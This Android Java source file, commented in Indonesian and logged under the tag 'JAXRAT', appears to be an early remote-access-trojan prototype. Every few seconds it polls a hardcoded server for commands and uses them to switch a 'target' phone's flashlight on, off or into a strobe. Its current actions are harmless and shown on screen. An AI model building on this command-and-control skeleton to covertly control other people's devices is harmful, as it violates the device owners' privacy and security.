package com.ezax.agent;

import android.app.Activity;
import android.content.Context;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    // --- IP UDAH DIGANTI KE 49 ---
    private static final String SERVER_URL = "http://192.168.1.49:5000"; 
    private static final String DEVICE_ID = "hp_target_1"; 
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isStrobe = false;
    private Handler strobeHandler = new Handler();
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isTorchOn = false; // Buat nyimpen status nyala/mati kelap-kelip

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        
        // Cari kamera belakang yang ada flash-nya
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Boolean flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                
                if (flashAvailable != null && flashAvailable && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
        } catch (CameraAccessException e) {
            Log.e("JAXRAT", "Kamera error", e);
        }

        startPolling();
    }

    private void startPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                fetchCommand();
                handler.postDelayed(this, 3000); // Nanya ke web tiap 3 detik
            }
        }, 3000);
    }

    private void fetchCommand() {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/get_command/" + DEVICE_ID);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = in.readLine()) != null) {
                    response.append(line);
                }
                in.close();

                JSONObject json = new JSONObject(response.toString());
                String cmd = json.optString("command", "none");
                if (!cmd.equals("none")) {
                    executeCommand(cmd);
                }
            } catch (Exception e) {
                Log.e("JAXRAT", "Gagal konek", e);
            }
        }).start();
    }

    private void executeCommand(String cmd) {
        runOnUiThread(() -> Toast.makeText(MainActivity.this, "Cmd: " + cmd, Toast.LENGTH_SHORT).show());

        if (cmd.equals("flash_on")) {
            stopStrobe(); setTorch(true);
        } else if (cmd.equals("flash_off")) {
            stopStrobe(); setTorch(false);
        } else if (cmd.equals("flash_strobe")) {
            startStrobe();
        } else if (cmd.equals("STOP_ALL")) {
            stopStrobe(); setTorch(false);
        }
    }

    private void setTorch(boolean state) {
        try {
            if (cameraId != null) {
                cameraManager.setTorchMode(cameraId, state);
            }
        } catch (CameraAccessException e) {
            Log.e("JAXRAT", "Gagal nyalain senter", e);
        }
    }

    private void startStrobe() {
        isStrobe = true;
        strobeHandler.post(strobeRunnable);
    }

    private void stopStrobe() {
        isStrobe = false;
        strobeHandler.removeCallbacks(strobeRunnable);
        setTorch(false);
    }

    // Kodingan Kelap-kelip (Strobe) yang udah dibenerin
    private final Runnable strobeRunnable = new Runnable() {
        @Override
        public void run() {
            if (isStrobe) {
                setTorch(!isTorchOn); // Balik kondisi (nyala/mati)
                isTorchOn = !isTorchOn;
                strobeHandler.postDelayed(this, 400); // Jeda 400ms biar hardware aman
            }
        }
    };
}
